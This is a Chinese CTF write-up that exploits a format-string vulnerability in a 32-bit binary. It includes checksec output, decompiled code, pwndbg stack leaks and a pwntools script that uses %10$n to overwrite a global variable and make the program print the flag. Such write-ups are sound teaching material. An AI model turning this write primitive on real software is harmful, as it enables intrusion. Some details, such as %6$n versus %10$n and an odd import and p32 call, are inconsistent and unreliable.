1. checksec

   ```
   [*] '/home/kali/Desktop/e41a0f684d0e497f87bb309f91737e4d'
       Arch:     i386-32-little
       RELRO:    Partial RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      No PIE (0x8048000)
   ```
   堆栈地址随机化，栈溢出保护开启，32位程序	
2. IDA静态分析：

   ```c
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
     __int16 v5; // [esp+26h] [ebp-76h]
     char s[100]; // [esp+28h] [ebp-74h] BYREF
     unsigned int v7; // [esp+8Ch] [ebp-10h]

     v7 = __readgsdword(0x14u);
     setbuf(stdin, 0);
     setbuf(stdout, 0);
     setbuf(stderr, 0);
     buf[0] = 0;
     buf[1] = 0;
     v5 = 0;
     memset(s, 0, sizeof(s));
     puts("please tell me your name:");
     read(0, buf, 0xAu);
     puts("leave your message please:");
     fgets(s, 100, stdin);
     printf("hello %s", (const char *)buf);
     puts("your message is:");
     printf(s);
     if ( pwnme == 8 )
     {
       puts("you pwned me, here is your flag:\n");
       system("cat flag");
     }
     else
     {
       puts("Thank you!");
     }
     return 0;
   }
   ```
   可以看到有可以利用的溢出函数，但由于栈保护开启，选择另一种利用方式，看到pwnme变量等于8即可获取flag
3. 观察到 `printf(s);`写法不规范导致格式化字符串漏洞，即利用%n参数，将上次标准输出的字符个数赋值给对应的参数，参数即为pwnme变量的地址，IDA查看得到  `0x0804A068`
4. 利用：

   栈顶是格式化字符串的参数，例如%d，%s，%n，参数之后就是等待输出的实参，可以先利用%p来泄露栈中的内容（格式化字符串的另一种利用方式），输入 `AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p`后，将这些字符存在了s数组中，调用printf打印时前四个A按字符串照常打印，而由于后边连续的%p丢失了参数，自动在栈上寻找对应的参数，我们看到如下数据

   ```
   pwndbg>   
   AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p
   pwndbg>   
   AAAA0xffffd28e0xf7e1d6200xffffd2f00xf7ffcff40x2c(nil)0x6b77d2f40xa79(nil)0x41414141
   0x080486d2 in main ()   
   pwndbg> x/20x $rsp  
   Value can't be converted to integer.   
   pwndbg> x/20x $esp   
   0xffffd270:     0xffffd298      0xffffd28e      0xf7e1d620      0xffffd2f0  
   0xffffd280:     0xf7ffcff4      0x0000002c      0x00000000      0x6b77d2f4  
   0xffffd290:     0x00000a79      0x00000000      0x41414141      0x70257025
   ```
   从 `0xffffd274`字节开始，后边的九个4字节的参数都是格式化字符串对应的实参，我们输入的AAAA在 `0xffffd298`字节处，为第十个格式化字符串对应的实参（也是s字符数组，在调用者的栈顶），若AAAA为p32编码后的 `0x0804A068（pwnme的地址）`，再将8写入该位置即可实现利用

   而将8写入利用到了另外一个参数，例如 `%6$n`，将标准输出的字符数赋值给格式化字符串的第6个参数，在本题中，若我们写入 `%10$n`即可将标准输出的字符数赋值给 `pwnme`，在栈中写入 `pwnme`的地址需要4字节，再写如四字节随机字母 `aaaa`，再写入 `%6$n`，即可构成 `0xffffd298+aaaa+%6$n`的利用
5. 实现

   ```python
   from pwn import *
   from pwn_p64 import *

   io = remote("61.147.171.105", 65024)

   payload = p32(0x0804A068, "hex") + b"aaaa%10$n"

   io.recvuntil("please tell me your name:".encode(encoding='utf-8'))
   io.sendline(b"wky ")

   io.recvuntil("leave your message please:".encode(encoding='utf-8'))
   io.sendline(payload)

   io.interactive()
   ```
